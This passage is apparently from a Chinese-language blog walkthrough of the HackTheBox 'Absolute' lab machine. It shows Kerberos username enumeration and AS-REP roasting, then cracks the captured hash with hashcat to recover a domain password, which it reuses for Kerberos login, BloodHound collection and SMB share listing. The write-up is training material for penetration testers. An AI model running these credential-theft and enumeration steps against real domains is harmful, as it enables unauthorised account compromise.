&gt;  Using KDC(s):</span><br><span class="line">2023/05/29 03:06:48 &gt;   dc.absolute.htb:88</span><br><span class="line"></span><br><span class="line">2023/05/29 03:06:49 &gt;  [+] VALID USERNAME:       j.roberts@absolute.htb</span><br><span class="line">2023/05/29 03:06:49 &gt;  [+] VALID USERNAME:       m.chaffrey@absolute.htb</span><br><span class="line">2023/05/29 03:06:51 &gt;  [+] VALID USERNAME:       s.osvald@absolute.htb</span><br><span class="line">2023/05/29 03:06:51 &gt;  [+] VALID USERNAME:       j.robinson@absolute.htb</span><br><span class="line">2023/05/29 03:06:51 &gt;  [+] VALID USERNAME:       d.klay@absolute.htb</span><br><span class="line">2023/05/29 03:06:52 &gt;  [+] VALID USERNAME:       n.smith@absolute.htb</span><br><span class="line">2023/05/29 03:06:57 &gt;  Done! Tested 88 usernames (6 valid) <span class="keyword">in</span> 8.120 seconds</span><br></pre></td></tr></table></figure>
+
+<p>很明显，这个domain使用的是[first initial].[lastname]作为用户名的语法。</p>
+<p>或者，crackmapexec也可以完成这个爆破任务</p>
+<h2 id="AS-Rep-Roast"><a href="#AS-Rep-Roast" class="headerlink" title="AS-Rep-Roast"></a>AS-Rep-Roast</h2><h3 id="抓取hash"><a href="#抓取hash" class="headerlink" title="抓取hash"></a>抓取hash</h3><p>没有密码，仍然无法连接到域来尝试Bloodhound或Kerberoasting。检查AS-Rep-Roast-able用户:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># GetNPUsers.py -dc-ip dc.absolute.htb -usersfile valid_users absolute.htb/                                                     1 ⨯</span></span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User j.roberts@absolute.htb doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User m.chaffrey@absolute.htb doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User s.osvald@absolute.htb doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User j.robinson@absolute.htb doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$d</span>.klay@absolute.htb@ABSOLUTE.HTB:7babac3563f9d82cdd68fc5f6a8c35bf<span class="variable">$6f67d29d9f1811e4fe60990d208c59ecf1850e55cc44ac5d2d31e8db12d663b514a2ab8f186fb70475960feffa9244139f153276a20dcbe4aa8d39739f419e6d19c13d4304c167c3854afa3da678b0594aa746b8f42ad39ef55c20aa501f817ba52722ab2c75b5eaeddf5ef8008bd3e61b2d19b672b7bb1db571b5c8d6cfe3ae357c731fa8c9bea2dad013b5b3439b2b0c4cbaff742d08dcfc1f7217f4c1818face9910b051b19567bdf0a0d68d715750d7cbad67c2c56064d1b8e5c3bdf7604fa408f76fc72012061bd2de8be211d57dddb04f93bf4122cb8d8a3d82be8c18e472184e798ae2477d70dea34</span></span><br><span class="line">[-] User n.smith@absolute.htb doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br></pre></td></tr></table></figure>
+
+<p>d.klay is vulnerable.</p>
+<h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><p>使用hashcat和rockyou.txt字典来破解密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe password.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344386</span><br><span class="line">* Bytes.....: 139921360</span><br><span class="line">* Keyspace..: 14344386</span><br><span class="line"></span><br><span class="line">$krb5asrep$23<span class="variable">$d</span>.klay@absolute.htb@ABSOLUTE.HTB:7babac3563f9d82cdd68fc5f6a8c35bf<span class="variable">$6f67d29d9f1811e4fe60990d208c59ecf1850e55cc44ac5d2d31e8db12d663b514a2ab8f186fb70475960feffa9244139f153276a20dcbe4aa8d39739f419e6d19c13d4304c167c3854afa3da678b0594aa746b8f42ad39ef55c20aa501f817ba52722ab2c75b5eaeddf5ef8008bd3e61b2d19b672b7bb1db571b5c8d6cfe3ae357c731fa8c9bea2dad013b5b3439b2b0c4cbaff742d08dcfc1f7217f4c1818face9910b051b19567bdf0a0d68d715750d7cbad67c2c56064d1b8e5c3bdf7604fa408f76fc72012061bd2de8be211d57dddb04f93bf4122cb8d8a3d82be8c18e472184e798ae2477d70dea34</span>:Darkmoonsky248girl</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)</span><br><span class="line">Hash.Target......: $krb5asrep$23<span class="variable">$d</span>.klay@absolute.htb@ABSOLUTE.HTB:7bab...0dea34</span><br><span class="line">Time.Started.....: Mon May 29 15:56:06 2023 (1 sec)</span><br><span class="line">Time.Estimated...: Mon May 29 15:56:07 2023 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........: 18230.5 kH/s (9.04ms) @ Accel:1024 Loops:1 Thr:32 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........:   240.9 kH/s (15.66ms) @ Accel:32 Loops:1 Thr:8 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........: 18471.4 kH/s</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 12746752/14344386 (88.86%)</span><br><span class="line">Rejected.........: 0/12746752 (0.00%)</span><br><span class="line">Restore.Point....: 11149312/14344386 (77.73%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: Fake@smile -&gt; 26101959</span></span><br><span class="line">Candidates.<span class="comment">#3....: 26101956 -&gt; 2591928</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 54c Util: 34% Core: 210MHz Mem:6000MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Mon May 29 15:55:43 2023</span><br><span class="line">Stopped: Mon May 29 15:56:09 2023</span><br></pre></td></tr></table></figure>
+
+<p>密码为: Darkmoonsky248girl</p>
+<h2 id="Kerberos-认证"><a href="#Kerberos-认证" class="headerlink" title="Kerberos 认证"></a>Kerberos 认证</h2><h3 id="使用CME验证"><a href="#使用CME验证" class="headerlink" title="使用CME验证"></a>使用CME验证</h3><p>使用 crackmapexec 验证失败:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.11.181 -u d.klay -p &#x27;Darkmoonsky248girl&#x27;</span></span><br><span class="line">SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION</span><br></pre></td></tr></table></figure>
+
+<p>STATUS_ACCOUNT_RESTRICTION 通常意味着禁用了NTLM，并且需要使用Kerberos进行身份验证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.11.181 -u d.klay -p &#x27;Darkmoonsky248girl&#x27; -k</span></span><br><span class="line">SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># ntpdate -u dc.absolute.htb</span></span><br><span class="line">2023-05-29 12:14:09.677756 (-0400) +25203.214272 +/- 0.465428 dc.absolute.htb 10.10.11.181 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25203.214272</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.11.181 -u d.klay -p &#x27;Darkmoonsky248girl&#x27; -k</span></span><br><span class="line">SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.181    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl</span><br></pre></td></tr></table></figure>
+
+<h3 id="kinit"><a href="#kinit" class="headerlink" title="kinit"></a>kinit</h3><p>配置&#x2F;etc&#x2F;krb5.conf文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = ABSOLUTE.HTB</span><br><span class="line">    kdc_timesync = 1</span><br><span class="line">    ccache_type = 4</span><br><span class="line">    forwardable = <span class="literal">true</span></span><br><span class="line">    proxiable = <span class="literal">true</span></span><br><span class="line">    fcc-mit-ticketflags = <span class="literal">true</span></span><br><span class="line">[realms]</span><br><span class="line">    ABSOLUTE.HTB = &#123;</span><br><span class="line">        kdc = dc.absolute.htb</span><br><span class="line">        admin_server = dc.absolute.htb</span><br><span class="line">        default_domain = absolute.htb</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>有些工具(如crackmapexec)可以单独使用Kerberos。对于其它工具，我需要一个ticket。可以用kinit生成一个:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># kinit d.klay</span></span><br><span class="line">Password <span class="keyword">for</span> d.klay@ABSOLUTE.HTB:</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># klist</span></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: d.klay@ABSOLUTE.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">05/29/2023 12:32:30  05/29/2023 16:32:30  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB</span><br><span class="line">        renew until 05/29/2023 16:32:30</span><br></pre></td></tr></table></figure>
+
+<p>Klist显示这已经在&#x2F;tmp&#x2F;krb5cc_1000中创建了一个ticket和其他ticket细节。</p>
+<p>如果我的时间和DC的时间之间的时钟偏差太大，将会失败。在VirtualBox中，停止同步时钟。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service vboxadd-service stop</span><br></pre></td></tr></table></figure>
+
+<p>然后运行sudo ntupdate 10.10.11.181。</p>
+<h1 id="Auth-as-svc-smb"><a href="#Auth-as-svc-smb" class="headerlink" title="Auth as svc_smb"></a>Auth as svc_smb</h1><h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><p>有了密码凭证后，可以使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveC1pdC9CbG9vZEhvdW5kLnB5">BloodHound.py<i class="fa fa-external-link-alt"></i></span>收集bloodhound数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># bloodhound-python -u d.klay -p &#x27;Darkmoonsky248girl&#x27; -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 -c ALL --zip      1 ⨯</span></span><br><span class="line">INFO: Found AD domain: absolute.htb</span><br><span class="line">INFO: Using TGT from cache</span><br><span class="line">INFO: Found TGT with correct principal <span class="keyword">in</span> ccache file.</span><br><span class="line">INFO: Connecting to LDAP server: dc.absolute.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.absolute.htb</span><br><span class="line">INFO: Found 18 <span class="built_in">users</span></span><br><span class="line">INFO: Found 55 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.absolute.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 01M 56S</span><br><span class="line">INFO: Compressing output into 20230529130934_bloodhound.zip</span><br></pre></td></tr></table></figure>
+
+<p>将zip文件上传到Bloodhound, 然后找到d.klay, 标记为已拿下:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute1.png"></li>
+</ul>
+<p>不幸的是，这个用户没有本地管理权限，没有执行权限，也没有出站对象控制权限:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute2.png"></li>
+</ul>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>有了creds，可以看看SMB shares:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/absolute]</span><br><span class="line">└─<span class="comment"># crackmapexec smb dc.absolute.htb -k -u d.klay -p &#x27;Darkmoonsky248girl&#x27; --shares</span></span><br><span class="line">SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [+] Enumerated shares</span><br><span class="line">SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         dc.absolute.htb 445    DC               -----           -----------     ------</span><br><span class="line">SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         dc.absolute.htb 445    DC               C$                              Default share</span><br><span class="line">SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share</span><br><span class="line">SMB         dc.absolute.htb 445    DC               Shared</span><br><span class="line">SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>
+
+<p>使用Impacket的smbclient.py来连接:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient.py absolute.htb/d.klay:Darkmoonsky248girl@dc.absolute.htb -k -no-pass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="Reference-Sources"><a href="#Reference-Sources" class="headerlink" title="Reference Sources"></a>Reference Sources</h1><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzA1LzI3L2h0Yi1hYnNvbHV0ZS5odG1s">0xdf’s blog absolute walkthrough<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3NoYWRvdy1jcmVkZW50aWFscy1hYnVzaW5nLWtleS10cnVzdC1hY2NvdW50LW1hcHBpbmctZm9yLXRha2VvdmVyLThlZTFhNTM1NjZhYg==">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3VyYmFuYWR2ZW50dXJlci91c2VybmFtZS1hbmFyY2h5">username-anarchy<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvcG5vcC9rZXJicnV0ZQ==">kerbrute<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k">BloodHound<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveC1pdC9CbG9vZEhvdW5kLnB5">BloodHound.py<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>fdvoid0
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2023/05/29/htb-absolute/" title="HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay]">https://fdlucifer.github.io/2023/05/29/htb-absolute/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="fa fa-stack-exchange"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/15/CVE-2020-8163-RCE/" rel="prev" title="Rails version < 5.0.1 & < 4.2.11.2 CVE-2020-8163 RCE">
+                  <i class="fa fa-chevron-left"></i> Rails version < 5.0.1 & < 4.2.11.2 CVE-2020-8163 RCE
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>Word count total: </span>
+    <span title="Word count total">628k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>Reading time total &asymp;</span>
+    <span title="Reading time total">38:05</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
